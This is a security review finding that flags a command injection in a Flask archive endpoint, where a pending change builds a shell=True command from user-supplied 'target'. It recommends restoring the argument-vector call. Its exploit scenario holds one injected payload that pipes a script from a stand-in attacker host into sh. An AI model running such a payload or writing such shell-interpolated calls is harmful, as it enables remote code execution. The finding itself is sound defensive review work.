# Vuln 1: Command Injection in archive handler: `app.py:15`

- Severity: HIGH
- Category: Command Injection
- Confidence: 0.99
- Description: The pending change replaces a safe argument-vector subprocess invocation with a shell-interpreted command string built from `request.json["target"]`. Because `target` is fully user-controlled and the call now uses `shell=True`, shell metacharacters such as `;`, `&&`, `$()`, or backticks can break out of the intended `--target` argument and execute arbitrary commands on the server.
- Exploit Scenario: An attacker who can reach this endpoint with a valid `X-Ops-Token` can submit a payload such as `{"target":"/srv/data; curl https://attacker.example/pwn.sh | sh"}`. The shell will execute the injected command with the privileges of the Flask service, resulting in remote code execution.
- Recommendation: Do not invoke a shell for this operation. Restore the original argv-style call, for example `subprocess.run(["/usr/local/bin/archive-job", "--target", target], ...)`, and add strict allowlisting or path validation for `target` if only specific directories are expected.
